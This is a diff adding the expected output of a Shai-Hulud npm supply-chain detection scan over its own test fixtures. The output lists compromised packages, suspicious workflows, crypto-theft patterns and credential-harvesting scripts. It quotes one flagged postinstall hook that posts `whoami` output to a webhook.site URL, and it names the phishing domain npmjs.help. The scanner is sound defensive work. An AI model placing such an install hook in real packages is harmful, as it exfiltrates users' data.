@@ -1,0 +1,74 @@
+Starting Shai-Hulud detection scan...
+Scanning directory: \\?\C:\Users\gstra\Code\shai-hulud-detect\test-cases
+Result (paranoid=false): high=17, medium=46, low= 0
+Result (paranoid=true): high=17, medium=61, low= 0
+Found workflow files:
+  - infected-project/.github/workflows/shai-hulud-workflow.yml
+Compromised packages found:
+  - chalk-debug-attack/package.json  ansi-styles@6.2.2
+  - chalk-debug-attack/package.json  chalk@5.6.1
+  - chalk-debug-attack/package.json  debug@4.4.2
+  - infected-project/package.json  @ctrl/deluge@1.2.0
+  - infected-project/package.json  @nativescript-community/ui-material-core@7.2.49
+  - infected-project/package.json  Contains packages from compromised namespace: @ctrl
+  - infected-project/package.json  Contains packages from compromised namespace: @nativescript-community
+  - lockfile-compromised/package.json  color-convert@3.1.1
+  - mixed-project/package.json  Contains packages from compromised namespace: @ctrl
+  - namespace-warning/package.json  Contains packages from compromised namespace: @ctrl
+  - namespace-warning/package.json  Contains packages from compromised namespace: @operato
+  - semver-matching/package.json  @operato/board@9.0.35
+  - semver-matching/package.json  Contains packages from compromised namespace: @ctrl
+  - semver-matching/package.json  Contains packages from compromised namespace: @operato
+Postinstall hooks:
+  - infected-project/package-with-postinstall.json  Suspicious postinstall: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)
+Suspicious content patterns:
+  - infected-project/.github/workflows/shai-hulud-workflow.yml  webhook.site reference
+  - infected-project/.github/workflows/shai-hulud-workflow.yml  malicious webhook endpoint
+  - infected-project/actual-credential-harvester.js  webhook.site reference
+  - infected-project/actual-credential-harvester.js  malicious webhook endpoint
+  - infected-project/malicious.js  webhook.site reference
+  - infected-project/malicious.js  malicious webhook endpoint
+  - infected-project/package-with-postinstall.json  webhook.site reference
+  - infected-project/package-with-postinstall.json  malicious webhook endpoint
+  - mixed-project/suspicious.js  webhook.site reference
+  - network-exfiltration-project/malicious.js  webhook.site reference
+  - network-exfiltration-project/malicious.js  malicious webhook endpoint
+Crypto patterns:
+  - chalk-debug-attack/malicious-chalk.js  Ethereum wallet address patterns detected
+  - chalk-debug-attack/malicious-chalk.js  Known crypto theft function names detected
+  - chalk-debug-attack/malicious-chalk.js  Known attacker wallet address detected - HIGH RISK
+  - chalk-debug-attack/malicious-chalk.js  Phishing domain npmjs.help detected
+  - chalk-debug-attack/malicious-chalk.js  Cryptocurrency regex patterns detected
+  - chalk-debug-attack/obfuscated-payload.js  Ethereum wallet address patterns detected
+  - chalk-debug-attack/obfuscated-payload.js  Known attacker wallet address detected - HIGH RISK
+  - chalk-debug-attack/obfuscated-payload.js  Phishing domain npmjs.help detected
+  - chalk-debug-attack/obfuscated-payload.js  JavaScript obfuscation detected
+  - common-crypto-libs/ethers-usage.js  Ethereum wallet address patterns detected
+  - infected-project/crypto-theft.js  Ethereum wallet address patterns detected
+  - infected-project/crypto-theft.js  Known attacker wallet address detected - HIGH RISK
+  - infected-project/crypto-theft.js  Phishing domain npmjs.help detected
+  - legitimate-crypto/wallet-utils.js  Ethereum wallet address patterns detected
+  - xmlhttp-malicious/malicious-script.js  Ethereum wallet address patterns detected
+  - xmlhttp-malicious/malicious-script.js  Known crypto theft function names detected
+  - xmlhttp-malicious/malicious-script.js  Known attacker wallet address detected - HIGH RISK
+Trufflehog activity:
+  - infected-project/malicious-trufflehog-wrapper.sh  HIGH  Trufflehog binary found
+  - infected-project/trufflehog-script.sh  HIGH  Trufflehog binary found
+  - false-positive-project/express-server.js  MEDIUM  Contains credential scanning patterns
+  - infected-project/actual-credential-harvester.js  MEDIUM  Contains credential scanning patterns
+  - infected-project/actual-credential-harvester.js  MEDIUM  Potentially suspicious environment variable access
+  - infected-project/malicious-trufflehog-wrapper.sh  MEDIUM  Contains trufflehog references in source code
+  - infected-project/malicious-trufflehog-wrapper.sh  HIGH  Credential patterns with potential exfiltration
+  - infected-project/trufflehog-script.sh  MEDIUM  Contains trufflehog references in source code
+  - infected-project/trufflehog-script.sh  MEDIUM  Contains credential scanning patterns
+  - infected-project/trufflehog-script.sh  MEDIUM  Potentially suspicious environment variable access
+  - legitimate-security-project/security-scanner.py  MEDIUM  Contains trufflehog references in source code
+  - legitimate-security-project/security-scanner.py  MEDIUM  Contains credential scanning patterns
+  - legitimate-security-project/security-scanner.py  MEDIUM  Potentially suspicious environment variable access
+  - network-exfiltration-project/malicious.js  HIGH  Environment scanning with exfiltration
+Package integrity issues:
+  - infected-lockfile/package-lock.json  Compromised package in lockfile: @ctrl/tinycolor@4.1.2
+  - infected-lockfile/package-lock.json  Recently modified lockfile contains @ctrl packages (potential worm activity)
+  - lockfile-compromised/package-lock.json  Compromised package in lockfile: color-convert@3.1.1
+  - lockfile-compromised/package-lock.json  Suspicious integrity hash patterns
+  - lockfile-false-positive/package-lock.json  Suspicious integrity hash patterns
